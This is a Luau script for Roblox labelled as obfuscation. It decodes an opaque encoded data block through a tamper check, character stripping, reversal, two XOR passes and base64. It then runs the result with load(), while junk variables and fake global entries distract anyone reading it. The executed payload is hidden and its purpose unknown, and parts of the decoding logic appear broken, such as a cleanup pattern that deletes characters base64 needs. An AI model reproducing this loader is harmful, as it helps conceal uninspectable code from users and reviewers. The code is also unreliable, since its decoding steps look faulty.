
-- Advanced Luau Obfuscation (Roblox-Compatible)
local bit32 = bit32  -- Ensure bitwise operations work in Luau
local _dataBlock = "wqrDqsKtwqTCjcKvwqjCt8KSwpTCicKrwobCmcKgw5/CmsKBw5zCs8KewpHCuMKhwo3Cl8KZwr3CicKZwqzCsMKFwp/DkMWFxbfFscWQxLTFvcWfxZfFjcW7xYfFnMW/xbXFrMS4xZXFosWfxYDFrcWtxY/FocWdxarEosWMxYnFpcWHxKzFpcWTxZHFsMWLxZ3FhMWRxa3FncWZxbzEnsWVxY/Ft8W2xZvEisWkxabFjcWvxJjFvcWKxbfFrMSIxYXFn8SMxIXErsSPxJTEncS9xKTEl8SOxKbFssScxInEtcSUxK3ElcS4xarEhMShxK3EnMSxxJ3EtcSXxIzElMSlxL/El8SlxInEgcSwxLXEncS/xLfErsSdxKfEvMSmxJXEpMSZxLXEmsSRxKTFgcSNxJTEkcS+xIjEmcSsxJPEhcSnxK/Hhcepx7HHlMeKx73Hj8eTx47Ho8eHx5zHrse1x5THl8eVx7bHsceEx4zHrcefxrjHncezx6nHjMelx6XHh8epx6XHl8eBx7TGkMedx4THo8eux5rHice4x4jHlceix6vHtceEx4HHoMejx43HvceVx77HlseJx6jHk8eFx7XHmcaGxrfGscaQxqLGvcaNxoPGjcalxrnGmMa1xrXGhcapxpXGoMaxxoDGsMatxprGucaexq3Gl8aIx63CpcKSwqnCpsKSwpHCsMK8wp3Cr8Krwq7CncKnwrjDmMKVwqLCu8K1wpnCv8Kgwr7CjcK9wp3CvsKQw4LCqMK4woXCpMKvxYbFqMWxxZDFjsW9xZzFk8WNxbzFucWYxbXFtcWExbXFlsW6xZ/FgMWdxa3FmsWDxZ7Ft8WpxYjEr8WlxZTFvcWlxZDFr8W0xa3FncWvxZHFrsWExafFuMSYxZXFt8W/xbbFmsWBxaDEgsWNxbrFs8W+xZLEgsWoxabFhcWnxYnEhcSuxKHEkMSyxL3EisSlxI3EpsS5xK7EpMS1xbjEpcSYxL/En8S2xL/ErcWixLHEkMSvxKnEvsS1xKXFqMSpxKfEkcSRxIbEkMSdxZLFiMSvxJzEp8SOxJrElcScxZzEt8SBxYrElsSQxI3Fg8SdxL/EiMWCxJ7EvsSFxI/Ep8eHx7DHscemx4XHvcayx4/HgMelxrLHrsa6x7XGuceHx5fHosehx7bGu8etxqPHoceQx7HHqce+x4rHpcapx5fHp8eKx4HHgsexx53Gkce/x6/HhMeJx47HqseVxpvHlce3x5vGiseWxoXHjceGx4HHsMeNx7fHnse2x4XGise7xofGpsaxxqbGtsa9xrbGvcaPxqLHssauxp/Gtce6xoPGmMajxrHGtsaQxq3Ho8aHxp/GtcaXxr7HrcKlw6vDqMKowobDmsKGwoXCncOQwqvCr8KCwonCjsKBwpXDm8K7wrfCmsOKwpbDn8KNwobCp8Kwwo/Ct8Kawq/ChcKPwqvFiMW0xbHFosS2xb3EscWTxYDFvMSyxarFvcW1xbzEoMWXxaLFscWyxb7FrcWnxZ/FkMWvxZfFusWExaXFr8WPxajFlMSaxYLElcWdxZTEkMWgxZ3EksWKxbTFlcWcxZXFt8WAxIrFksWfxY3EgMWFxb/FnsWJxZrFuMWFxY/EjMSHxK7EocSixJTEvcWwxbTEj8ShxbLEqsSIxLXEocShxJjEv8SxxLLFocStxaPEscSQxLPEl8S6xJnEpcSuxazEqMSLxJHEgsSAxJ3ElMWUxKDEgcSnxIrFnsSVxIHEu8S4xJrEkcSSxIHEjcSHxKfEv8SIxLfEmsSVxIXEjsSrx4jHqca6x6LHo8e9x7fHj8eLx7jHqceAx63Huse+x4fHk8ehx5/HnMebx6LHpsefx5zHtcaix5DHuMeqx67Hj8emx4zHgce0x7THnce8x5XHrcefx4nHvMe/"
local _key1 = 247
local _key2 = 221
local _expectedHash = "75509"

-- Tamper Detection
local function verifyIntegrity()
    local function calculateHash(str)
        local sum = 0
        for i = 1, #str do
            sum = sum + string.byte(str, i)
        end
        return tostring(sum % 100000)
    end
    if calculateHash(_dataBlock) ~= _expectedHash then
        error("Integrity check failed. Terminating.")
    end
end
verifyIntegrity()

-- Junk Data Injection
local junkVariables = {}
for i = 1, 300 do
    junkVariables[i] = "DATA_" .. tostring(math.random(100000, 999999))
end

-- Scrambling Cleanup
local function clean(str)
    return str:gsub("[XYZ123!@#$%^&*()-_=+[{]}|;:,<.>/?]", "")
end

-- Reverse Function
local function reverse(str)
    return str:reverse()
end

-- Decryption Function (Using bit32.bxor for Luau)
local function decrypt(str, key)
    local decoded = ""
    for i = 1, #str do
        decoded = decoded .. string.char(bit32.bxor(string.byte(str, i), key + (i % 256)))
    end
    return decoded
end

-- Base64 Decode Function
local function decodeBase64(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Extra Fake Execution Paths
for i = 1, 150 do
    local name = "fakeData_" .. i
    _G[name] = tostring(math.random(1, 100000)) .. "_DUMMY"
end

-- Execute Decrypted Script (Compatible with Luau & Roblox)
local decrypted = decrypt(decrypt(reverse(clean(_dataBlock)), _key2), _key1)
local scriptFunc = load(decodeBase64(decrypted))
if scriptFunc then scriptFunc() end
